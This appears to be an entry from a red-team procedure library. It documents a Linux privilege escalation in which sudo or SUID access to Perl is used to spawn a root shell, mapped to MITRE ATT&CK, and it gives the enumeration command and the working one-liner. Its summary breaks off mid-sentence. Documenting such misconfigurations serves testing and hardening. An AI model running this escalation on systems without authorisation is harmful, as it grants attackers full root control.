---
id: 25502c3e-2167-46e3-8658-b7f2498f4379
name: Spawn a Root Shell using Sudo and Perl
type: procedure
verified: true
submitted: true
created_at: '2019-11-23T01:30:50.531954+00:00'
updated_at: '2023-05-26T00:52:34.166380+00:00'
tactics:
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Sudo|T1169 - Sudo]]'
platforms:
- Linux
tags:
- '[[privileges]]'
- '[[Service Attacks]]'
commands:
- '[[sudo -l]]'
- '[[description]]'
- '[[Perl Spawn a Root Shell Using Sudo]]'
---

# Spawn a Root Shell using Sudo and Perl

**Status**: ✓ Verified

## Summary

In some instances, a user may need to run Perl commands as root. This is often implemented by giving the user permission to use sudo to execute Perl, or Perl itself may be configured with SUID rights. Both situations introduce a privilege escalation vulnerability,  as attackers can use it to spawn 

## Description

# Description

In some instances, a user may need to run Perl commands as root. This is often implemented by giving the user permission to use sudo to execute Perl, or Perl itself may be configured with SUID rights. Both situations introduce a privilege escalation vulnerability,  as attackers can use it to spawn a shell as root, gaining full control over the system.

# Instructions

1. Check if the current user has been configured to run commands with sudo.

**Command** ([[sudo -l]]):

```bash
sudo -l
```

2. Execute Perl using Sudo to spawn a shell.

**Command** ([[Perl Spawn a Root Shell Using Sudo]]):

```bash
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Sudo|T1169 - Sudo]]

## Commands Used

- [[sudo -l]]
- [[description]]
- [[Perl Spawn a Root Shell Using Sudo]]

## Tags

- [[privileges]]
- [[Service Attacks]]
